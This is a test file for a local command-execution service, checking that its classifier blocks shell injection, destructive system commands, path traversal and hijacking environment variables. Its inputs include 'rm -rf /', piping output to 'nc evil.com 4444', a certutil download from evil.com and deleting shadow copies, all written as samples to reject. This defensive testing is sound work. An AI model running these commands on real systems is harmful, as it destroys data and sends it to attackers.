import { describe, it, expect, beforeEach, afterEach } from "vitest";
import fs from "node:fs";
import path from "node:path";
import os from "node:os";
import {
  LocalBridgeError,
  LocalBridgeErrorCode,
  type CommandSpec,
} from "@localbridge/protocol";
import { CommandClassifier } from "@localbridge/security";
import { ProjectRegistry } from "../apps/runner/src/projects/index.js";
import {
  ExecutableRegistry,
  ProcessRunner,
  CommandExecutionService,
} from "../apps/runner/src/process/index.js";

describe("Structured Shell Command Execution & Security", () => {
  let tempDir: string;
  let registryPath: string;
  let projectDir: string;
  let projectRegistry: ProjectRegistry;
  let commandService: CommandExecutionService;
  let projectId: string;

  beforeEach(() => {
    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "lb-shell-exec-test-"));
    registryPath = path.join(tempDir, "projects.json");
    projectDir = path.join(tempDir, "project");
    fs.mkdirSync(projectDir, { recursive: true });

    projectRegistry = new ProjectRegistry(registryPath);
    const rec = projectRegistry.add(projectDir, {
      name: "Shell Exec Project",
      accessMode: "read-write",
    });
    projectId = rec.id;

    const execRegistry = new ExecutableRegistry();
    const runner = new ProcessRunner();
    commandService = new CommandExecutionService(
      projectRegistry,
      execRegistry,
      runner,
      tempDir
    );
  });

  afterEach(() => {
    try {
      fs.rmSync(tempDir, { recursive: true, force: true });
    } catch {
      // ignore
    }
  });

  describe("CommandClassifier Risk Analysis for shell-command", () => {
    it("classifies inspection commands as SAFE", () => {
      const safeCommands: CommandSpec[] = [
        {
          kind: "shell-command",
          projectId: "p1",
          command: "cargo",
          args: ["--version"],
        },
        {
          kind: "shell-command",
          projectId: "p1",
          command: "go",
          args: ["version"],
        },
        {
          kind: "shell-command",
          projectId: "p1",
          command: "python",
          args: ["--version"],
        },
        {
          kind: "shell-command",
          projectId: "p1",
          command: "git",
          args: ["status"],
        },
      ];

      for (const spec of safeCommands) {
        const assessment = CommandClassifier.classify(spec);
        expect(assessment.risk).toBe("SAFE");
        expect(assessment.executesProjectCode).toBe(false);
      }
    });

    it("classifies project build and check commands as CAUTION", () => {
      const cautionCommands: CommandSpec[] = [
        {
          kind: "shell-command",
          projectId: "p1",
          command: "cargo",
          args: ["check"],
        },
        {
          kind: "shell-command",
          projectId: "p1",
          command: "cargo",
          args: ["test"],
        },
        {
          kind: "shell-command",
          projectId: "p1",
          command: "go",
          args: ["test", "./..."],
        },
        {
          kind: "shell-command",
          projectId: "p1",
          command: "npm",
          args: ["run", "build"],
        },
      ];

      for (const spec of cautionCommands) {
        const assessment = CommandClassifier.classify(spec);
        expect(assessment.risk).toBe("CAUTION");
        expect(assessment.executesProjectCode).toBe(true);
      }
    });

    it("blocks injection sequences as DANGEROUS", () => {
      const injectionAttempts: CommandSpec[] = [
        {
          kind: "shell-command",
          projectId: "p1",
          command: "cargo",
          args: ["check", ";", "rm", "-rf", "/"],
        },
        {
          kind: "shell-command",
          projectId: "p1",
          command: "go",
          args: ["test", "&&", "powershell.exe"],
        },
        {
          kind: "shell-command",
          projectId: "p1",
          command: "python",
          args: ["-c", "`calc.exe`"],
        },
        {
          kind: "shell-command",
          projectId: "p1",
          command: "git",
          args: ["status", "|", "nc", "evil.com", "4444"],
        },
      ];

      for (const spec of injectionAttempts) {
        const assessment = CommandClassifier.classify(spec);
        expect(assessment.risk).toBe("DANGEROUS");
        expect(assessment.reasons.some((r) => r.includes("injection") || r.includes("prohibited"))).toBe(true);
      }
    });

    it("blocks prohibited extreme dangerous system commands as DANGEROUS", () => {
      const dangerousCommands: CommandSpec[] = [
        {
          kind: "shell-command",
          projectId: "p1",
          command: "format",
          args: ["C:"],
        },
        {
          kind: "shell-command",
          projectId: "p1",
          command: "reg",
          args: ["delete", "HKLM\\Software"],
        },
        {
          kind: "shell-command",
          projectId: "p1",
          command: "certutil",
          args: ["-urlcache", "-f", "http://evil.com"],
        },
        {
          kind: "shell-command",
          projectId: "p1",
          command: "vssadmin",
          args: ["delete", "shadows"],
        },
      ];

      for (const spec of dangerousCommands) {
        const assessment = CommandClassifier.classify(spec);
        expect(assessment.risk).toBe("DANGEROUS");
      }
    });
  });

  describe("CommandExecutionService execution of shell-command", () => {
    it("executes safe shell command (python --version) in safe-only mode", async () => {
      projectRegistry.setExecutionMode(projectId, "safe-only");

      const spec: CommandSpec = {
        kind: "shell-command",
        projectId,
        command: "python",
        args: ["--version"],
      };

      const result = await commandService.run(spec);
      expect(result.exitCode).toBe(0);
      expect(result.risk).toBe("SAFE");
      expect(result.stdout + result.stderr).toMatch(/Python 3\./);
    });

    it("blocks caution shell command in safe-only mode", async () => {
      projectRegistry.setExecutionMode(projectId, "safe-only");

      const spec: CommandSpec = {
        kind: "shell-command",
        projectId,
        command: "cargo",
        args: ["check"],
      };

      await expect(commandService.run(spec)).rejects.toThrowError(LocalBridgeError);
      try {
        await commandService.run(spec);
      } catch (err) {
        expect((err as LocalBridgeError).code).toBe(LocalBridgeErrorCode.COMMAND_BLOCKED);
      }
    });

    it("executes caution shell command in project-code mode and captures exitCode/output", async () => {
      projectRegistry.setExecutionMode(projectId, "project-code");

      // Test git status inside project directory
      const spec: CommandSpec = {
        kind: "shell-command",
        projectId,
        command: "git",
        args: ["--version"],
      };

      const result = await commandService.run(spec);
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toMatch(/git version/i);
    });

    it("enforces directory containment (blocks path traversal in relative cwd)", async () => {
      projectRegistry.setExecutionMode(projectId, "project-code");

      const spec: CommandSpec = {
        kind: "shell-command",
        projectId,
        command: "node",
        args: ["-v"],
        cwd: "../../../windows/system32",
      };

      await expect(commandService.run(spec)).rejects.toThrow();
    });

    it("strips dangerous environment variables while preserving safe ones", async () => {
      projectRegistry.setExecutionMode(projectId, "project-code");

      // Run node to print process.env.SAFE_VAR and process.env.NODE_OPTIONS
      const script = `
        console.log("SAFE=" + (process.env.SAFE_CUSTOM || "none"));
        console.log("DANGEROUS=" + (process.env.NODE_OPTIONS || "none"));
      `;
      fs.writeFileSync(path.join(projectDir, "env-check.js"), script);

      const spec: CommandSpec = {
        kind: "shell-command",
        projectId,
        command: "node",
        args: ["env-check.js"],
        env: {
          SAFE_CUSTOM: "safe-value-123",
          NODE_OPTIONS: "--require /tmp/malicious.js",
        },
      };

      const result = await commandService.run(spec);
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toContain("SAFE=safe-value-123");
      expect(result.stdout).toContain("DANGEROUS=none");
    });
  });
});
